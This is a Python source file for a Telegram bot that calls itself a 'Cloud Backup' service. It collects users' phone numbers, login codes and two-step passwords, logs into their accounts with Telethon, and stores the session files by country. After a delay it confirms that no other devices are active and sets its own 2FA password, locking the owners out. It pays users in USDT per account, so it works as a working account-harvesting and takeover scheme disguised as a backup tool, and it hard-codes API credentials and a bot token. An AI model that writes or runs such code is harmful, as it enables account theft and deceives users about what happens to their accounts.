import os
import asyncio
import json
import shutil
import zipfile
from datetime import datetime
from threading import Thread
from flask import Flask, render_template_string
import telebot
from telebot import types
from telethon import TelegramClient, functions, types as tl_types
from telethon.errors import SessionPasswordNeededError

# ==================== কোর এডমিন কনফিগারেশন ====================
API_ID = 36547444
API_HASH = "119a3ac4fd3dc368df92ae6d81f3bb3e"
BOT_TOKEN = "8970655570:AAGb0C4KmwkOzUxHNA29O6SHfJ2omqrUMJ4"
ADMIN_ID = 8095751648
# =========================================================

bot = telebot.TeleBot(BOT_TOKEN, parse_mode="Markdown")
app = Flask(__name__)

BASE_STORAGE_DIR = "user_backups"
DB_FILE = "user_database.json"
SETTINGS_FILE = "bot_settings.json"

if not os.path.exists(BASE_STORAGE_DIR):
    try: os.makedirs(BASE_STORAGE_DIR, exist_ok=True)
    except: pass

user_data = {}
admin_state = {}

DEFAULT_SETTINGS = {
    "security_password": "MySecureBotPassword123",
    "country_prices": {"52": 0.51, "60": 0.47, "49": 0.90, "54": 0.50, "880": 0.15, "57": 0.24},
    "country_capacity": {"52": 9965982, "60": 100, "49": 838, "54": 500, "880": 50, "57": 100},
    "country_delays": {"52": 600, "60": 600, "49": 600, "54": 600, "880": 600, "57": 600}
}

def load_settings():
    if os.path.exists(SETTINGS_FILE):
        try:
            with open(SETTINGS_FILE, "r") as f:
                loaded = json.load(f)
                for key in DEFAULT_SETTINGS:
                    if key not in loaded: loaded[key] = DEFAULT_SETTINGS[key]
                return loaded
        except: return DEFAULT_SETTINGS
    return DEFAULT_SETTINGS

def save_settings(settings):
    try:
        with open(SETTINGS_FILE, "w") as f: json.dump(settings, f, indent=4)
    except: pass

def load_db():
    if os.path.exists(DB_FILE):
        try:
            with open(DB_FILE, "r") as f: return json.load(f)
        except: return {}
    return {}

def save_db(db):
    try:
        with open(DB_FILE, "w") as f: json.dump(db, f, indent=4)
    except: pass

def get_user_stats(user_id):
    db = load_db()
    uid = str(user_id)
    if uid not in db:
        db[uid] = {"verified": 0, "unverified": 0, "balance": 0.0, "frozen_count": 0, "frozen_balance": 0.0}
        save_db(db)
    return db[uid]

def add_user_account_success(user_id, amount):
    db = load_db()
    uid = str(user_id)
    if uid not in db:
        db[uid] = {"verified": 0, "unverified": 0, "balance": 0.0, "frozen_count": 0, "frozen_balance": 0.0}
    db[uid]["verified"] += 1
    db[uid]["balance"] = round(db[uid]["balance"] + amount, 2)
    save_db(db)

def get_current_file_count(country_code):
    target_dir = os.path.join(BASE_STORAGE_DIR, country_code)
    if not os.path.exists(target_dir): return 0
    try: return len([f for f in os.listdir(target_dir) if f.endswith(".session")])
    except: return 0

# ==================== UPTIME WEB SERVER ====================
@app.route('/')
def home():
    settings = load_settings()
    total_sessions = 0
    country_list_html = ""
    for code in settings["country_prices"]:
        count = get_current_file_count(code)
        total_sessions += count
        cap = settings["country_capacity"].get(code, "No Limit")
        country_list_html += f"<tr><td><b>+{code}</b></td><td>{count} / {cap}</td><td>${settings['country_prices'][code]}</td></tr>"

    html_template = f"""
    <!DOCTYPE html><html><head><title>Dashboard</title><meta name="viewport" content="width=device-width, initial-scale=1"><style>body {{ font-family: sans-serif; background-color: #0f172a; color: #f8fafc; text-align: center; padding: 40px 20px; }} .card {{ background: #1e293b; max-width: 450px; margin: auto; padding: 25px; border-radius: 10px; border: 1px solid #334155; }} h1 {{ color: #38bdf8; }} table {{ width: 100%; margin-top: 15px; text-align: left; }} th, td {{ padding: 8px; border-bottom: 1px solid #334155; }}</style></head>
    <body><div class="card"><h2 style="color:#10b981;">● SERVER ONLINE</h2><h1>Cloud Backup Bot</h1><p>Total Saved Sessions: <b>{total_sessions}</b></p><table><tr><th>Country</th><th>Used/Cap</th><th>Price</th></tr>{country_list_html}</table></div></body></html>
    """
    return render_template_string(html_template)

def run_web():
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port)

# অ্যাসিনক্রোনাস কাজের জন্য গ্লোবাল ইভেন্ট লুপ তৈরি
bot_loop = asyncio.new_event_loop()
def start_async_loop(loop):
    asyncio.set_event_loop(loop)
    loop.run_forever()

Thread(target=start_async_loop, args=(bot_loop,), daemon=True).start()

def check_valid_country_and_get_code(phone_number):
    clean = phone_number.replace("+", "").replace(" ", "")
    settings = load_settings()
    sorted_codes = sorted(settings["country_prices"].keys(), key=len, reverse=True)
    for code in sorted_codes:
        if clean.startswith(code):
            return code
    return None

# ==================== ফ্রন্টএন্ড ইউজার হ্যান্ডলার্স ====================
def process_start(message):
    welcome_text = (
        "👋 **Welcome to Cloud Backup Telegram Bot**\n\n"
        "To start a secure backup of your Telegram Account, please send your phone number with your country code.\n"
        "Example: `+88017XXXXXXXX` or `+52XXXXXXXXXX`"
    )
    bot.send_message(message.chat.id, welcome_text)

def process_cancel(message):
    user_id = message.from_user.id
    if user_id in user_data:
        try: asyncio.run_coroutine_threadsafe(user_data[user_id]["client"].disconnect(), bot_loop)
        except: pass
        del user_data[user_id]
    bot.send_message(message.chat.id, "❌ **Cancelled.**\n\nYou can send a new phone number to start again.")

def process_capacity(message):
    settings = load_settings()
    response = f"👍 **Available Countries : ({len(settings['country_prices'])})**:\n\n"
    for code in settings["country_prices"]:
        prc = settings["country_prices"][code]
        cap = settings["country_capacity"].get(code, 999)
        delay = settings.get("country_delays", {}).get(code, 60)
        response += f"🌍 **+{code}**\nFree:${prc}|New:${prc}|Spam:${prc}|Perm:${prc}|{cap}|{delay}s\n\n"
    bot.send_message(message.chat.id, response)

def process_account(message):
    user_id = message.from_user.id
    stats = get_user_stats(user_id)
    current_time = datetime.now().strftime("%m/%d/%y")
    current_clock = datetime.now().strftime("%H:%M:%S")
    
    response = (
        f"👤 **ID : {user_id}**\n\n"
        f"✅ Number of verified accounts : {stats['verified']}\n"
        f"⏳ Number of unverified accounts : {stats['unverified']}\n"
        f"🅈 Available Balance IN USDT : {stats['balance']:.2f}\n"
        f"🛢 Number of frozen account : {stats['frozen_count']}\n"
        f"🧊 Total Frozen Balance : {stats['frozen_balance']:.2f}\n\n"
        f"📅 Date : {current_time}\n"
        f"🕐 Time : {current_clock} ( NZ Time )\n\n"
        f"✍️ *Note : You Can Also Check Your Withdraw History Using This Command*\n\n"
        f"/withdrawhistory"
    )
    bot.send_message(message.chat.id, response)

@bot.message_handler(commands=['start'])
def cmd_start(message): process_start(message)

@bot.message_handler(commands=['cancel'])
def cmd_cancel(message): process_cancel(message)

@bot.message_handler(commands=['capacity'])
def cmd_capacity(message): process_capacity(message)

@bot.message_handler(commands=['account'])
def cmd_account(message): process_account(message)

# ==================== এডমিন কন্ট্রোল প্যানেল UI ====================
@bot.message_handler(commands=['panel'])
def admin_panel_command(message):
    if message.from_user.id != ADMIN_ID: return
    settings = load_settings()
    markup = types.InlineKeyboardMarkup(row_width=2)
    
    btn_pass = types.InlineKeyboardButton("🔐 Change 2FA Password", callback_data="pnl_pass")
    btn_set_country = types.InlineKeyboardButton("🌍 Set Country (All-in-One)", callback_data="pnl_set_country")
    btn_all_sessions = types.InlineKeyboardButton("📂 All Session Files", callback_data="pnl_all_files")
    btn_close = types.InlineKeyboardButton("❌ Close Panel", callback_data="pnl_close")
    
    markup.add(btn_pass, btn_set_country)
    markup.add(btn_all_sessions)
    markup.add(btn_close)
    
    panel_msg = (
        "🛠 *Master Admin Control Panel*\n\n"
        f"🔐 *Default 2FA Password:* `{settings['security_password']}`\n\n"
        "📈 *Currently Allowed/Opened Countries:*\n"
    )
    for code in settings["country_prices"]:
        prc = settings["country_prices"][code]
        cap = settings["country_capacity"].get(code, "No Limit")
        delay = settings.get("country_delays", {}).get(code, 60)
        panel_msg += f"• 🌍 `+{code}` ➜ Price: **${prc}** | Cap: **{cap}** | Time: **{delay}s**\n"
        
    bot.send_message(message.chat.id, panel_msg, reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith("pnl_"))
def handle_admin_callbacks(call):
    if call.from_user.id != ADMIN_ID: return
    if call.data == "pnl_close":
        bot.delete_message(call.message.chat.id, call.message.message_id)
        return
    if call.data == "pnl_all_files":
        settings = load_settings()
        total_files = 0
        file_msg = "📂 *Live Backup Session Files Count:*\n\n"
        for code in settings["country_prices"]:
            count = get_current_file_count(code)
            total_files += count
            file_msg += f"🌍 Country `+{code}`: **{count} Pcs**\n"
        file_msg += f"\n📊 *Total Combined Backup Files:* `{total_files} Pcs`"
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("⬅️ Back to Panel", callback_data="pnl_back"))
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=file_msg, reply_markup=markup, parse_mode="Markdown")
        return
    if call.data == "pnl_back":
        bot.delete_message(call.message.chat.id, call.message.message_id)
        admin_panel_command(call.message)
        return

    bot.delete_message(call.message.chat.id, call.message.message_id)
    if call.data == "pnl_pass":
        bot.send_message(call.message.chat.id, "🔐 **Please enter the new default 2FA password:**")
        admin_state[call.from_user.id] = "wait_pass"
    elif call.data == "pnl_set_country":
        guide_msg = (
            "🌍 *Set Country Parameters (All-In-One)*\n\n"
            "Format: `Code=Price=Capacity=DelayTime`\n"
            "Example: `880=0.15=50=600`"
        )
        bot.send_message(call.message.chat.id, guide_msg)
        admin_state[call.from_user.id] = "wait_country_all"

# ==================== গ্লোবাল মেসেজ ফিল্টারিং ও কান্ট্রি ভ্যালিডেশন ====================
@bot.message_handler(func=lambda message: True)
def handle_text(message):
    user_id = message.from_user.id
    text = message.text.strip()
    low_text = text.lower()

    if user_id == ADMIN_ID and user_id in admin_state:
        state = admin_state[user_id]
        settings = load_settings()
        del admin_state[user_id]
        try:
            if state == "wait_pass":
                settings["security_password"] = text
                save_settings(settings)
                bot.reply_to(message, f"✅ Updated to: `{text}`")
            elif state == "wait_country_all":
                parts = text.split("=")
                code = parts[0].strip().replace("+", "")
                price = float(parts[1].strip())
                capacity = int(parts[2].strip())
                delay = int(parts[3].strip())
                settings["country_prices"][code] = price
                settings["country_capacity"][code] = capacity
                if "country_delays" not in settings: settings["country_delays"] = {}
                settings["country_delays"][code] = delay
                save_settings(settings)
                bot.reply_to(message, f"✅ Country `+{code}` updated successfully.")
        except Exception as e:
            bot.reply_to(message, f"❌ Format Error: {str(e)}")
        return

    if "start" in low_text or "/start" in low_text: process_start(message); return
    elif "cancel" in low_text or "/cancel" in low_text: process_cancel(message); return
    elif "capacity" in low_text or "/capacity" in low_text: process_capacity(message); return
    elif "account" in low_text or "/account" in low_text: process_account(message); return

    # ওটিপি কোড হ্যান্ডলিং
    if user_id in user_data and ("phone_code_hash" in user_data[user_id] or user_data[user_id].get("waiting_for_password")):
        asyncio.run_coroutine_threadsafe(verify_otp_task(text, user_id, message), bot_loop)
        return

    # নম্বর ইনপুট ও কান্ট্রি ফিল্টার
    if text.startswith("+") or text.isdigit():
        phone = text if text.startswith("+") else f"+{text}"
        matched_country_code = check_valid_country_and_get_code(phone)
        
        if not matched_country_code:
            bot.reply_to(message, "❗you cannot at account from country.")
            return
            
        processing_msg = bot.reply_to(message, "🔄 Processing please wait...")
        asyncio.run_coroutine_threadsafe(send_otp_task(phone, matched_country_code, user_id, message, processing_msg), bot_loop)
    else:
        bot.reply_to(message, "❌ Invalid Command or Phone Number format. Use /start to reset.")

# ==================== ওটিপি ও সেশন কোর ব্যাকএন্ড (রানিং ইন বোতল লুপ) ====================
async def send_otp_task(phone_number, country_code, user_id, message, processing_msg):
    settings = load_settings()
    max_capacity = settings["country_capacity"].get(country_code, 9999)
    if get_current_file_count(country_code) >= max_capacity:
        bot.edit_message_text(f"❌ **Capacity Over!** for code `+{country_code}`.", message.chat.id, processing_msg.message_id)
        return

    clean_phone = phone_number.replace("+", "").replace(" ", "")
    final_session_path = os.path.join(BASE_STORAGE_DIR, country_code, f"+{clean_phone}")
    os.makedirs(os.path.dirname(final_session_path), exist_ok=True)
    
    for ext in [".session", ".session-journal"]:
        if os.path.exists(final_session_path + ext):
            try: os.remove(final_session_path + ext)
            except: pass

    user_client = TelegramClient(final_session_path, API_ID, API_HASH, base_logger='critical')
    try:
        await user_client.connect()
        sent_code = await user_client.send_code_request(phone_number)
        user_data[user_id] = {
            "client": user_client, "phone": phone_number, "phone_code_hash": sent_code.phone_code_hash,
            "clean_phone": clean_phone, "session_path": final_session_path, "country_code": country_code
        }
        
        otp_prompt = (
            "🔢 Enter the code sent to the number or send the message.\n\n"
            f"🇨🇴 ( `{phone_number}` )\n\n"
            "🦤 /cancel"
        )
        bot.edit_message_text(otp_prompt, message.chat.id, processing_msg.message_id)
    except Exception as e:
        bot.edit_message_text(f"❌ Error: {str(e)}", message.chat.id, processing_msg.message_id)
        try: await user_client.disconnect()
        except: pass

async def verify_otp_task(text, user_id, message):
    data = user_data[user_id]
    user_client = data["client"]
    
    if data.get("waiting_for_password"):
        try:
            await user_client.sign_in(password=text)
            await process_security_and_backup(user_id, message, data, user_client)
            del user_data[user_id]
        except Exception as e: bot.reply_to(message, f"❌ Password Error: {str(e)}")
    else:
        try:
            await user_client.sign_in(data["phone"], text, phone_code_hash=data["phone_code_hash"])
            await process_security_and_backup(user_id, message, data, user_client)
            del user_data[user_id]
        except SessionPasswordNeededError:
            bot.reply_to(message, "🔐 Two-step verification active. Enter 2FA Password:")
            user_data[user_id]["waiting_for_password"] = True
        except Exception as e: 
            bot.reply_to(message, f"❌ OTP Error: {str(e)}")

async def process_security_and_backup(user_id, message, data, current_client):
    settings = load_settings()
    country_delays = settings.get("country_delays", {})
    delay = country_delays.get(data['country_code'], 600)
    price = settings["country_prices"].get(data['country_code'], 0.24)
    
    success_text = (
        f"✅ The account number `{data['phone']}` was successfully received\n\n"
        f"❗ You have to wait {delay} seconds time to confirm the account, please log out\n\n"
        f"👇 The bot will automatically verify your account\n\n"
        f"🏷️ Spam Status : 🕊️ Free As Bird"
    )
    
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton(f"✅ Account Verification {price}", callback_data="none"))
    bot.reply_to(message, success_text, reply_markup=markup)
    
    await asyncio.sleep(delay)
    try:
        auths = await current_client(functions.account.GetAuthorizationsRequest())
        if len([a for a in auths.authorizations if not a.current]) > 0:
            bot.send_message(message.chat.id, f"❌ **Verification Failed!** Other active devices detected on `{data['phone']}`.")
            await current_client.disconnect()
            return False
            
        try:
            await current_client(functions.account.UpdatePasswordSettingsRequest(
                password=tl_types.InputCheckPasswordEmpty(),
                new_settings=tl_types.PasswordInputSettings(new_password=settings["security_password"], hint="Cloud Lock")
            ))
        except: pass
        
        await current_client.disconnect()
        add_user_account_success(user_id, price)
        bot.send_message(ADMIN_ID, f"🔔 **New Verified Session Saved:** `{data['phone']}`")
    except Exception as e:
        pass

if __name__ == "__main__":
    # Flask সার্ভার ব্যাকগ্রাউন্ড থ্রেডে স্টার্ট করা (Render-এর জন্য পোর্ট ৮MD ওপেন রাখা)
    Thread(target=run_web, daemon=True).start()
    # টেলিগ্রাম পোলিং স্টার্ট করা মেইন থ্রেডে
    bot.infinity_polling(skip_pending=True)
